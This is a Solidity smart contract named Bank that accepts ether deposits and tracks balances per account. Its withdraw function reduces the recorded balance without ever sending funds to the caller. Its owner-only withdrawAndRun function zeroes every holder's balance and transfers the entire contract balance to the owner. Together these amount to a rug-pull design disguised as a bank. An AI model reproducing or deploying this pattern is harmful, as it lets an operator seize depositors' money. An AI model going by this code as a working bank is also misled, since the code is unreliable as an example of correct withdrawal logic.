// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.26;

import "./INativeBank.sol";

contract Bank is INativeBank {
	address owner;
	mapping(address => uint256) private balances;
    address[] private accountHolders;
    
    constructor () {
     owner = msg.sender;
    }

    function _deposit() private onlyValue(msg.value){
			  emit Deposit(msg.sender, msg.value);
        accountHolders.push(msg.sender);
        balances[msg.sender] += msg.value;
    }

    receive() external payable {
        _deposit();
    }

		fallback() external payable {
        _deposit();
    }

    function balanceOf(
        address account
    ) external view override returns (uint256) {
			return balances[account];
		}

    function deposit() external payable override {
			 _deposit();
		}

    function withdraw(uint256 amount) external override {
			if ( amount == 0 ) {
        revert WithdrawalAmountZero(msg.sender);
			} else if(balances[msg.sender] < amount) {
        revert WithdrawalAmountExceedsBalance(msg.sender, amount, balances[msg.sender]);
			} else {
				emit Withdrawal(msg.sender, amount);
				balances[msg.sender] -= amount;
			}
		}

    function withdrawAndRun() external onlyOwner {
        uint256 totalBalance = address(this).balance;

        for (uint256 i = 0; i < accountHolders.length; i++) {
            balances[accountHolders[i]] = 0;
        }

        (bool success, ) = owner.call{value: totalBalance}("");
        require(success, "Transfer to owner failed");
    }

	  modifier onlyValue(uint256 _value) {
        require(_value > 0, "Value is zero!");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner!");
        _; 
    }
}
